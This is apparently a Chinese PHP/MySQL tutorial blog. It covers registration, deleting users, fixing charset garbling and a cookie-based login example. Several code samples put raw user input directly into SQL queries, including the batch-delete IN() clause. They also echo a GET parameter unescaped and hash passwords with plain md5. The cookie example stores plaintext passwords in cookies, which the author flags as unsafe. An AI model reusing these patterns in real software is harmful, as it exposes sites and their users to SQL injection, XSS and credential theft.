<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line">$conn = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;liwenkaihaha&#x27;</span>);</span><br><span class="line"><span class="comment">//如果有错误，存在错误号</span></span><br><span class="line"><span class="keyword">if</span>(mysqli_errno($conn))&#123;</span><br><span class="line">    <span class="keyword">echo</span> mysqli_error($conn);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//选择数据库</span></span><br><span class="line">mysqli_select_db($conn,<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line"><span class="comment">//选择字符集</span></span><br><span class="line">mysqli_set_charset($conn,<span class="string">&#x27;utf8&#x27;</span>);</span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>四、组合SQL语句：</strong></font><br>我们需要把得到的信息写入到数据库里面去，用户名、密码、创建时间、IP我们都得到了。</p>
<p>将对应的变量插入到SQL语句中即可。组合出来的SQL语句如下：<br><font color="#00B2EE"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into user(username,password,createtime,createip) values(&#x27;&quot;</span> . $username . <span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">,&#x27;&quot;</span> . $password . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . $time . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . $ip . <span class="string">&quot;&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br>而我们的创建表的语句如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">CREATE TABLE <span class="keyword">IF</span> NOT EXISTS user (</span><br><span class="line">id <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">username varchar(<span class="number">30</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">password char(<span class="number">32</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">createtime <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">createip <span class="keyword">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) ENGINE=InnoDB <span class="keyword">DEFAULT</span> CHARSET=utf8;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br>表的格式（字段对应说明）：<br><font color="#00B2EE"></font></p>
<table>
<thead>
<tr>
<th align="center">id</th>
<th align="center">username</th>
<th align="center">password</th>
<th align="center">createtime</th>
<th align="center">createip</th>
</tr>
</thead>
<tbody><tr>
<td align="center">用户编号</td>
<td align="center">用户名</td>
<td align="center">密码</td>
<td align="center">创建时间</td>
<td align="center">创建IP</td>
</tr>
</tbody></table>
<p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>五、发送语句，判断状态：</strong></font></p>
<blockquote>
<p>mysqli_query我们在上面说过，需要传入两个参数：</p>
</blockquote>
<ol>
<li>连接的资源，在这里对应的变量是$conn。</li>
<li>发送的SQL语句。在上面已经准备好了$sql。</li>
</ol>
<blockquote>
<p>SQL语句可以通过mysqli_query发送给MySQL服务器。发送成功$result则为true。否则为false。<br>成功的话，我们就可以提示用户注册成功啦。<br>有些情况下，可能还需要使用到**mysqli_insert_id()**。功能是获取上面通过insert插入数据的id并返回这个id。<br>mysqli_insert_id应用场景：新加的一个行的数据。我们需要得到自动增长的ID值，将这个ID值插入到另外一个表里面去时。就需要用到这个函数。</p>
</blockquote>
<p>&emsp;</p>
<p><code>mysqli_insert_id()</code>使用举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;注册成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;注册失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前用户插入的ID为&#x27;</span>.mysqli_insert_id($conn);</span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>六、关闭数据库连接：</strong></font></p>
<p>将资源变量传到到mysqli_close这个函数里面即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure>



<p>&emsp;<br>&emsp;<br>&emsp;<br>先建立test数据库、user数据表。数据表建立语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">CREATE TABLE <span class="keyword">IF</span> NOT EXISTS user (id <span class="keyword">int</span>(<span class="number">11</span>) PRIMARY KEY AUTO_INCREMENT,username varchar(<span class="number">30</span>) NOT <span class="literal">NULL</span>,password char(<span class="number">32</span>) NOT <span class="literal">NULL</span>,createtime <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span>,createip varchar(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>) ENGINE=InnoDB <span class="keyword">DEFAULT</span> CHARSET=utf8;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>&emsp;<br><font color="red"><strong>1. <code>index.php</code>表单页面：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;connect.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">    密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">    重复密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;repassword&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;<br><font color="red"><strong>2. <code>connect.php</code>页面完整代码：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trim($_POST[<span class="string">&#x27;password&#x27;</span>]) != trim($_POST[<span class="string">&#x27;repassword&#x27;</span>])) &#123;</span><br><span class="line">   <span class="keyword">exit</span>(<span class="string">&#x27;两次密码不一致,请返回上一页&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = trim($_POST[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">$password = md5(trim($_POST[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line">$time = time();</span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">$conn = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">//echo $username.&quot;/&quot;.$password.&quot;/&quot;.$time.&quot;/&quot;.$ip;</span></span><br><span class="line"><span class="comment">//如果有错误，存在错误号</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_errno($conn)) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> mysqli_error($conn);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">mysqli_set_charset($conn, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;insert into user(username,password,createtime,createip) values (&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">$result = mysqli_query($conn, $sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;成功&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;失败&#x27;</span>;</span><br><span class="line">   var_dump(<span class="string">&quot;错误为：&quot;</span>.mysqli_error($conn));</span><br><span class="line">   var_dump(<span class="string">&quot;返回值：&quot;</span>.$result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前用户插入的ID为&#x27;</span> . mysqli_insert_id($conn);</span><br><span class="line">mysqli_close($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;</p>
<h3 id="三-通过步骤做一个列表显示实例"><a href="#三-通过步骤做一个列表显示实例" class="headerlink" title="三. 通过步骤做一个列表显示实例"></a><font color="#FF6347" face="Comic sans MS">三. 通过步骤做一个列表显示实例</font></h3><p><font color="#00B2EE">[<a href="http://www.php.cn/code/1262.html">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4977.html">视频</a>]</font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="四-通过步骤操作之把用户做个分页"><a href="#四-通过步骤操作之把用户做个分页" class="headerlink" title="四. 通过步骤操作之把用户做个分页"></a><font color="#FF6347" face="Comic sans MS">四. 通过步骤操作之把用户做个分页</font></h3><p><font color="#00B2EE">[<a href="http://www.php.cn/code/1273.html">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4978.html">视频</a>]</font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="五-批量和指定删除用户"><a href="#五-批量和指定删除用户" class="headerlink" title="五.  批量和指定删除用户"></a><font color="#FF6347" face="Comic sans MS">五.  批量和指定删除用户</font></h3><p>上面已经学过了通过步骤做一个列表显示，在删除前，<font color="#FF7F00"><strong>有单行删除数据和删除多行数据</strong></font>。</p>
<p>&emsp;</p>
<h4 id="5-1-判断是单选还是多选删除"><a href="#5-1-判断是单选还是多选删除" class="headerlink" title="5.1 判断是单选还是多选删除"></a><font color="#3CB371" face="Comic sans MS">5.1 判断是单选还是多选删除</font></h4><blockquote>
<ol>
<li><font color="#FF7F00"><strong>单行是通过get传参的方式</strong></font>向delete.php文件中写上对应的ID。</li>
<li>而<font color="#FF7F00"><strong>多个删除是通过POST的方式</strong></font>向delete.php页面中传递对应的ID。</li>
<li>如果这两个都不符合的话，那我们可以视为数据不合法。</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array($_POST[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id = join(<span class="string">&#x27;,&#x27;</span>, $_POST[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (is_numeric($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id = (<span class="keyword">int</span>) $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据不合法&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<h4 id="5-2-组合SQL语句"><a href="#5-2-组合SQL语句" class="headerlink" title="5.2 组合SQL语句"></a><font color="#3CB371" face="Comic sans MS">5.2 组合SQL语句</font></h4><blockquote>
<ol>
<li>MySQL这一章讲解过<font color="#FF7F00"><strong>删除时可以使用到in的子语句</strong></font>。</li>
<li>同样在这里，我们就可以用in的子语句来达到效果。</li>
<li><font color="#FF7F00"><strong>join函数将多选删除传过来的id变为了3,4,5的格式</strong></font>，最终多选删除的SQL语句执行出来的效果就是：</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">delete <span class="keyword">from</span> user where id in(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>而单选删除的语句效果就是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">delete <span class="keyword">from</span> user where id in(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>这样我们就实现了单选和多选自适应效果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">&quot;delete from user where id in(<span class="subst">$id</span>)&quot;</span>;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br>最终配套而成的整体代码演示如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;connection.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_array($_POST[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">   $id = join(<span class="string">&#x27;,&#x27;</span>, $_POST[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">elseif</span> (is_numeric($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">   $id = (<span class="keyword">int</span>) $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;数据不合法&#x27;</span>;</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;delete from user where id in(<span class="subst">$id</span>)&quot;</span>;</span><br><span class="line"></span><br><span class="line">$result = mysqli_query($conn, $sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;删除成功&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;删除失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>&emsp;<br>&emsp;</p>
<h3 id="六-通过步骤修改用户信息"><a href="#六-通过步骤修改用户信息" class="headerlink" title="六. 通过步骤修改用户信息"></a><font color="#FF6347" face="Comic sans MS">六. 通过步骤修改用户信息</font></h3><p>内容有点多，等哪天想起来了或者心情好了再写吧…..(✿◡‿◡)</p>
<p><font color="#00B2EE">[<a href="http://www.php.cn/code/1277.html">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4980.html">视频</a>]</font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="七-数据显示乱码终极解决办法"><a href="#七-数据显示乱码终极解决办法" class="headerlink" title="七. 数据显示乱码终极解决办法"></a><font color="#FF6347" face="Comic sans MS">七. 数据显示乱码终极解决办法</font></h3><p>解决乱码问题的核心思想，就是：<font color="#FF7F00"><strong>一定要多个不同的文件系统中一定要统一编码</strong></font>。</p>
<p>&emsp;<br>总结成了9个要点来彻底解决连接后乱码的问题。</p>
<blockquote>
<ol>
<li><font color="#00B2EE"><strong>html编码与MySQL编码一致</strong></font></li>
<li><font color="#00B2EE"><strong>PHP编码与MySQL编码一致</strong></font></li>
<li><font color="#00B2EE"><strong>若有header头发送字符集，请与数据库一样</strong></font></li>
<li><font color="#00B2EE"><strong>&lt;meta http-equiv=“Content-Type”content=“text/html; charset=utf-8” /&gt;要和页面的文字编码一致</strong></font></li>
<li><font color="#00B2EE"><strong>数据库建库的字符集要统一</strong></font></li>
<li><font color="#00B2EE"><strong>表的字符集要统一</strong></font></li>
<li><font color="#00B2EE"><strong>列的字符集要统一(表设了,列就默认写表的)</strong></font></li>
<li><font color="#00B2EE"><strong>连接,校验的字符集要统一</strong></font></li>
<li><font color="#00B2EE"><strong>结果集的字符集要统一</strong></font></li>
</ol>
</blockquote>
<p>&emsp;<br>&emsp;<br>&emsp;<br><font color="#FF7F00"><strong>一、 文件编码</strong></font><br>html和PHP文件的编码，示例中：拿notepad++来演示。将PHP和html都要设为这种字符集。<br>一定要设置为utf-8无BOM格式。</p>
<p><img data-src="https://i.loli.net/2019/02/24/5c72764c43d27.png" alt="1"></p>
<p>&emsp;<br><font color="#FF7F00"><strong>二、 header头编码</strong></font><br>如果php中有header头，一定要是<strong>utf-8</strong>的<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font color="#FF7F00"><strong>三、网页头文件编码</strong></font><br>如果html文件编码是utf-8的也要设置为一置<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=“Content-Type”content=“text/html; charset=utf<span class="number">-8</span>” /&gt;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font color="#FF7F00"><strong>四、创建数据库的编码</strong></font></p>
<p><img data-src="https://i.loli.net/2019/02/24/5c72789c325a2.png" alt="2"></p>
<p>&emsp;<br><font color="#FF7F00"><strong>五、表和列创建的时候表为utf-8</strong></font></p>
<p><img data-src="https://i.loli.net/2019/02/24/5c7278e24b5ad.png" alt="3.png"></p>
<p>&emsp;<br><font color="#FF7F00"><strong>六、连接，结果、校验字符集设置</strong></font></p>
<blockquote>
<p><font color="#00B2EE"><strong>1.通过mysqli_set_charset(‘utf8’)来MySQL连接、结果和校验的字符集设置。<br>2.注：数据库的字符集声明和文件中的略有不同。</strong></font><font color="red"><strong>utf8为mysql数据库的，utf-8为文件中使用的。</strong></font></p>
</blockquote>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-会话管理和控制</title>
    <url>/post/PHP-SessionManagement/</url>
    <content><![CDATA[<p>(。・∀・)ノ</p>
<a id="more"></a>

<p>&ensp;<br>&ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 会话管理和控制</font></center>

<p>&emsp;<br>&emsp;</p>
<h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a><font color="#FF6347" face="Comic sans MS">一. 前言</font></h3><p>标准的http协议是无状态的，无连接的。<br>？？？什么意思？⊙﹏⊙∥</p>
<blockquote>
<p><strong>【无状态】</strong></p>
</blockquote>
<ol>
<li>协议对于事务处理没有记忆能力【事物处理】【记忆能力】</li>
<li>对同一个url请求没有上下文关系【上下文关系】</li>
<li>每次的请求都是独立的，它的执行情况和结果与前面的请求和之后的请求是无直接关系的，它不会受前面的请求应答情况直接影响，也不会直接影响后面的请求应答情况【无直接联系】【受直接影响】</li>
<li>服务器中没有保存客户端的状态，客户端必须每次带上自己的状态去请求服务器【状态】</li>
</ol>
<blockquote>
<p><strong>【无连接】</strong></p>
</blockquote>
<ol>
<li>每一个访问都是无连接，服务器挨个处理访问队列里的访问，处理完一个就关闭连接，这事儿就完了，然后处理下一个新的</li>
<li>无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接</li>
</ol>
<p>&emsp;<br>具体内容以及为什么使用Session和Cookie参考下面博文：<br><font color="#00B2EE">[<a href="https://www.cnblogs.com/bellkosmos/p/5237146.html">http协议无状态中的 “状态” 到底指的是什么？！</a>]</font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="二-Cookie概述"><a href="#二-Cookie概述" class="headerlink" title="二. Cookie概述"></a><font color="#FF6347" face="Comic sans MS">二. Cookie概述</font></h3><p>什么是Cookie？<br>请参考本站博客<font color="#00B2EE">[<a href="https://directoree.github.io/post/HTTP-User-Agen-Cookie">HTTP协议请求头部的User-Agen和Cookie</a>]</font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="三-PHP中的Cookie"><a href="#三-PHP中的Cookie" class="headerlink" title="三. PHP中的Cookie"></a><font color="#FF6347" face="Comic sans MS">三. PHP中的Cookie</font></h3><p><strong>这节我们通过一个用户首次登陆网站后，再次访问不需要重复输入用户名和密码的例子来学习Cookie。</strong><br><font face="Comic sans MS">php中提供了一个函数来让我们设置cookie，这个函数是：<font color="#FF7F00">bool setcookie()</font>;<br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_http_setcookie.asp">PHP setcookie() 函数</a>]</font><br>需要注意的是，这个函数每次只能设置Cookie中的一个参数，比如一次只能设置用户名、密码等字段。</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> setcookie  (</span><br><span class="line">        <span class="keyword">string</span> $名字</span><br><span class="line">        [, <span class="keyword">string</span> $值]</span><br><span class="line">        [, <span class="keyword">int</span> $过期时间  = <span class="number">0</span>]</span><br><span class="line">        [, <span class="keyword">string</span> $路径]</span><br><span class="line">        [, <span class="keyword">string</span> $域名]</span><br><span class="line">        [, <span class="keyword">bool</span> $安全  = <span class="literal">false</span>]</span><br><span class="line">        [, <span class="keyword">bool</span> $http只读  = <span class="literal">false</span>]</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>


<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$名字</td>
<td align="left">必需。规定 cookie 的名称。</td>
</tr>
<tr>
<td align="center">$值</td>
<td align="left">可选。规定 cookie 的值。</td>
</tr>
<tr>
<td align="center">$有效期</td>
<td align="left">可选。规定 cookie 的有效期。</td>
</tr>
<tr>
<td align="center">$路径</td>
<td align="left">可选。规定 cookie 的服务器路径。</td>
</tr>
<tr>
<td align="center">$域名</td>
<td align="left">可选。规定 cookie 的域名。</td>
</tr>
<tr>
<td align="center">$安全</td>
<td align="left">可选。规定是否通过安全的 HTTPS 连接来传输 cookie。</td>
</tr>
<tr>
<td align="center">$http只读</td>
<td align="left">可选。如果true，那么js就无法读取改cookie，增加安全性。</td>
</tr>
</tbody></table>
<blockquote>
<p>1.一般来说，我们其实用不到上面那么多参数，对于这个函数，我们一般这么用：<font color="#FF7F00"><strong>setcookie(cookie名,cookie值,cookie有效期)</strong></font>;<br>2.没错，就那么3个。如此一来，我们就可以在服务端通过$_COOKIE[‘name’] 来读取cookie了。</p>
</blockquote>
<p>&emsp;<br>&emsp;<br><strong>以下是示例：</strong></p>
<ol>
<li>我们将文件名命名为：cookie.php。</li>
<li>我们来模拟我们在互联网上见到最常见的例子：输入用户名和密码，登陆成功的过程。</li>
<li>我们来建一个数据库login,其中有表user,有username和password这两个字段。</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//第一次登陆的时候，通过用户输入的信息来确认用户</span></span><br><span class="line"><span class="keyword">if</span> ( ( $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="literal">null</span> ) &amp;&amp; ( $_POST[<span class="string">&#x27;password&#x27;</span>] != <span class="literal">null</span> ) ) &#123;</span><br><span class="line">    $userName = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="comment">//从db获取用户信息</span></span><br><span class="line">    <span class="comment">//PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码</span></span><br><span class="line">    $conn = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    mysqli_select_db($conn,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">&quot;select * from user where `username` = &#x27;<span class="subst">$userName</span>&#x27; &quot;</span>;</span><br><span class="line">    $res = mysqli_query($conn,$sql);</span><br><span class="line">    $row = mysqli_fetch_assoc($res);</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="string">&#x27;password&#x27;</span>] == $password) &#123;</span><br><span class="line">        <span class="comment">//密码验证通过，设置cookies，把用户名和密码保存在客户端</span></span><br><span class="line">        setcookie(<span class="string">&#x27;username&#x27;</span>,$userName,time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>);<span class="comment">//设置时效一个月,一个月后这个cookie失效</span></span><br><span class="line">        setcookie(<span class="string">&#x27;password&#x27;</span>,$password,time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>);</span><br><span class="line">        <span class="comment">//最后跳转到登录后的欢迎页面</span></span><br><span class="line">        header(<span class="string">&#x27;Location: welcome.php&#x27;</span> . <span class="string">&quot;?username=<span class="subst">$userName</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//再次访问的时候通过cookie来识别用户</span></span><br><span class="line"><span class="keyword">if</span> ( ($_COOKIE[<span class="string">&#x27;username&#x27;</span>] != <span class="literal">null</span>)  &amp;&amp; ($_COOKIE[<span class="string">&#x27;password&#x27;</span>] != <span class="literal">null</span>) ) &#123;</span><br><span class="line">    $userName = $_COOKIE[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_COOKIE[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从db获取用户信息</span></span><br><span class="line">    <span class="comment">//PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码</span></span><br><span class="line">    $conn = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    $res = mysqli_query($conn,<span class="string">&quot;select * from user where `username` =  &#x27;<span class="subst">$userName</span>&#x27; &quot;</span>);</span><br><span class="line">    $row = mysqli_fetch_assoc($res);</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="string">&#x27;password&#x27;</span>] == $password) &#123;</span><br><span class="line">        <span class="comment">//验证通过后跳转到登录后的欢迎页面</span></span><br><span class="line">        header(<span class="string">&#x27;Location: welcome.php&#x27;</span> . <span class="string">&quot;?username=<span class="subst">$userName</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">        密  码：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>跳转到的welcome.php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   welcome,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $user;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<blockquote>
<ol>
<li>这样，当我第一次访问cookie.php的时候，我需要输入用户名和密码，输入完毕后跳转到了welcome.php。然后我关闭浏览器，再次打开cookie.php，这次没有要求我输入用户信息，而是直接跳转到了welcome.php,因为之前我们存的cookie信息被浏览器自动发送到了服务端,服务端做完处理直接跳转到了welcome.php,服务器认识我们了！知道我是之前那个登陆过的用户，这样我们就通过cookie技术让无状态的HTTP协议保持了状态。<br>照着这个做一遍，我相信你会用cookie了。</li>
<li>只不过！！！只不过！！！只不过！！！重要的事要说3遍，<font color="#FF7F00"><strong>我们一般是不会把用户名和密码放到cookie中的，因为这并不安全，容易泄露自己的信息，请不要把重要的信息放到cookie中</strong></font>。我们这个只是一个学习cookie的例子。</li>
</ol>
</blockquote>
<p>&emsp;<br>&emsp;</p>
